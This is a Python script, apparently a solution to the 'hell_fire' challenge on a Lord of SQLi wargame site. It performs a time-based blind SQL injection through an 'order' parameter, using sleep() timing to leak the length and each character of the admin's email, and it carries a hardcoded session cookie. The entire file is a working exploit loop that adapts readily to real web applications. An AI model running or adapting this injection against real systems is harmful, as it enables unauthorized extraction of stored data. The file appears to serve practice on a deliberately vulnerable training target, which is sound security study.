#!/usr/bin/env python3
# coding: utf-8

import requests
import time
from math import floor

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    before = time.time()
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select id='admin' and sleep(({0})*2))".format(query)
    r = requests.get(url, headers=headers)
    after = time.time()
    if after - before >= 2:
        return True
    return False


def get_password_length():
    i = 0
    while True:
        query = 'length(email)={0}'.format(i)
        if is_true(query):
            return i
        i += 1


def guess_char(location):
    for i in range(0xff):
        query = "ord(mid(email,{0},1))={1}".format(location, i)
        if is_true(query):
            return chr(i)


def get_password():
    length = get_password_length()
    print('[*] email length :', length)
    password = ''
    for i in range(1, length + 1):
        password += guess_char(i)
        print('[*] leaked email :', password)
    return password


def main():
    print('[*] password :', get_password().lower())


if __name__ == '__main__':
    main()

